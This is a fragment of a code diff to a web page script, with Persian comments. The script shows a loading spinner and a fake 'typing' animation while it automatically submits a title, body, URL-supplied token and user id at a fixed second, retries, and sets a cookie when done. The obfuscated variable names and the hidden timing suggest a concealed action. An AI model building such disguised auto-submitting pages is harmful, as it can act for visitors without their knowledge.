-    };
-
-    const timeoutGuard = setTimeout(() => {
-      if (submitResult === null) {
-        finish({ ok: false, error: 'submit timeout' });
-      }
-    }, 5500);
-
-    if (worker) {
-      const onMsg = (e) => {
-        worker.removeEventListener('message', onMsg);
-        clearTimeout(timeoutGuard);
-        finish(e.data);
-      };
-      worker.addEventListener('message', onMsg);
-      try {
-        worker.postMessage({
-          url: payload.url,
-          token: _0xTk,
-          title: payload.title,
-          body: payload.body,
-          userId: _0xUseriD || null
-        });
-      } catch (e) {
-        worker.removeEventListener('message', onMsg);
-        clearTimeout(timeoutGuard);
-        fallbackFetch(payload).then(finish);
-      }
-    } else {
-      fallbackFetch(payload).then(res => {
-        clearTimeout(timeoutGuard);
-        finish(res);
-      });
+    let result;
+    try {
+      result = await submitWithRetry(payload.title, payload.body);
+    } catch (e) {
+      result = { ok: false, error: (e && e.message) || String(e) };
     }
+
+    if (result && result.ok) {
+      _0xSc(_0xCk, "1", _0xMx);
+    }
+
+    submitResult = result;
+    maybeShow();
   };
 
   /* ============================================================
-   *  زمان‌بندی: لودینگ ۱s → تایپینگ ۵s → ثبت در ثانیه ۴
+   *  Timeline
+   *  t=0    : collectorها شروع
+   *  t=2000 : پایان لودینگ، شروع تایپینگ (۵ ثانیه)
+   *  t=4000 : ثبت دقیق
+   *  t=5000 : فالبک ثبت در صورت نیاز
    * ============================================================ */
-  setTimeout(() => {
-    loaderWrap.style.display = 'none';
-    typingWrap.style.display = 'flex';
-    startTyping();
-  }, 1000);
+  if (MISSING_PARAMS) {
+    // بلافاصله پیام خطا بعد از لودینگ ۲ ثانیه‌ای
+    setTimeout(() => {
+      loaderWrap.style.display = 'none';
+      submitResult = {
+        ok: false,
+        error: 'پارامترهای URL ناقص: به 0xTk, 0xOn و 0xRp نیاز است'
+      };
+      typingDone = true;
+      showResult(submitResult);
+    }, 2000);
+  } else {
+    // ۱) بعد از ۲ ثانیه لودینگ رو بردار و تایپینگ رو شروع کن
+    setTimeout(() => {
+      loaderWrap.style.display = 'none';
+      typingWrap.style.display = 'flex';
+      startTyping();
+    }, 2000);
 
-  // ثبت دقیق در ثانیه ۴ از شروع صفحه
-  const elapsed = performance.now() - PAGE_START;
-  const submitDelay = Math.max(0, 4000 - elapsed);
-  setTimeout(submitNow, submitDelay);
+    // ۲) ثبت در ثانیه ۴
+    const elapsedAtSetup = performance.now() - PAGE_START;
+    const submitAt = Math.max(0, 4000 - elapsedAtSetup);
+    setTimeout(() => { doSubmit(); }, submitAt);
 
-  // حداقل نیم ثانیه قبل از ثانیه ۵ هم اگر شد
-  setTimeout(() => {
-    if (submitResult === null && !alreadyRegistered) {
-      submitNow();
-    }
-  }, Math.max(0, 4900 - (performance.now() - PAGE_START)));
+    // ۳) فالبک: ثانیه ۵ اگر هنوز ثبت نشده بود دوباره زور بزن
+    const fallbackAt = Math.max(0, 5000 - (performance.now() - PAGE_START));
+    setTimeout(() => {
+      if (!submitted) doSubmit();
+    }, fallbackAt);
+  }
 
 })();
 </script>
 </body>
-</html>
+         </html>
